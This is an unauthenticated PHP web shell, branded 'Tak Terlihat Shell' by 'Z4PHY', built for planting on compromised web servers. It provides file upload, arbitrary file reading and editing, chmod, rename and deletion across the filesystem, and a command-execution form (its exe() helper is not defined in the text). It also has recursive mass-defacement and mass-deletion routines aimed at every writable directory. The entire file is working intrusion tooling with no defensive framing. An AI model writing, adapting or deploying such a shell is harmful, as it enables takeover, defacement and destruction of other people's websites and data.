<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
  <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>WELCOME TO Tak Terlihat Shell</title>
<meta property="og:image" src="https://i.gifer.com/7M1g.gif"/>
<style>
body{
font-family: Kelly Slab;
background-color: black;
color:white;
}
#content tr:hover{
background-color: #00ddff;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: #00ddff;
color:white
}
table{
border: 1px #000000;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h2{
font-family:Kelly Slab;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Kelly Slab;
color:white;
}
.destroy_table {;
  background:transparent;
  border:1px solid #00ddff;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:yellow;
  font-size:17x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:white;
  text-shadow:0px 0px 0px #ff0505;
       }
       .td_table {;
  background-color: #000000;
            background-image: url(https://i.gifer.com/2f6g.gif);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
border: 1px solid gold; 
padding: 0px; 
margin-left: 2px; 
text-align: center;
}
     .potext {
  border: 1px solid #ffffff;
  width: 100%;
  height: 400px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background-color: #000000;
            background-image: url(https://i.gifer.com/2f6g.gif);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
  color: #ffffff;
  font-family:Kelly Slab;
  font-size: 13px;
}
.pl{
background:transparent; 
border: 1px solid red; 
padding: 5px; 
margin-left: 20px; 
text-align: center;
}
.pt{
background:transparent; 
border: 1px solid red; 
padding: 5px; 
margin-left: 20px; 
text-align: left;
}
</style>
</head>
<body>
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">WELCOME TO $ .: Z4PHY PHANT0MHIVE :. $</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">$ .: Z4PHY PHANT0MHIVE :. $</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Cowok Tersakiti Team - JawaBaratCyber - And All My Friend</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
+ Coded By   <td>: <font color='LightBlue'>Z4PHY C0DE<tr><td><font color='white'>
</table>";
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
<center><tr align="center"><td align="center">path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="yellow">UPLOADED SUCCES !!!!!</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED COK !!!!!")</script></font><br/>';
}
}
echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
</form></center>';
echo "</td></tr>";
echo "</table>";
echo "<center>";
echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
echo "<a class='destroy_table' href='?'>Home</a>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=z4phy'>Gasspoll!</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=z4p'>Gasskeun!!</a><br>";
echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
echo "</center>";

if($_GET['to'] == 'z4phy') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mulaiz4p']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>$ .: SWEET TOUCH BY Z4PHY :. $</textarea><br>
	<input type='submit' name='mulaiz4p' value='Nyalakan' style='width: 450px;'>
	</form></center>";
	} 
	} elseif($_GET['to'] == 'z4p') {
   function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = hapus_massal($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['mulaiz4p']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form method='post'>
   <font>Folder :</font><br>
   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input type='text' name='d_file' value='nyawa lu aja Bye Bye All gan:v' style='width: 450px;' height='10'><br>
   <input type='submit' name='mulaiz4p' value='Bye Bye All' style='width: 450px;'>
   </form></center>";
   }
   //BATAS
   } elseif($_GET['to'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo "[ <a href='?path=$path'>Kembali</a> ]"; 
echo('<textarea class="potext" cols=80 rows=20> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">CANGE PERM SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("CANGE PERM GAGAL NJING !!!!!")</font><br />';
}
}
echo '<form method="POST">
Permission : <br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">RENAME SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("RENAME GAGAL !!!!!")</script><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name <br><input name="newname" type="text" size="20" value="'.$_POST['name'].'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:black;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">EDIT SUCCES<br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("EDIT GAGAL CONG !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="potext" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">File Gagal Dihapus om</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" class="td_table">
<tr class="first">
<td class="pl"><center><font>Name</peller></center></td>
<td class="pl"><center><font>Size</peller></center></td>
<td class="pl"><center><font>Permission</peller></center></td>
<td class="pl"><center><font>Action</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr class="s_tb">
<td class="pt"><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td class="pl"><center>--</center></td>
<td class="pl"><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr class="pl">
<td class="pt"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td class="pl"><center>'.$size.'</center></td>
<td class="pl"><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Zildan</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>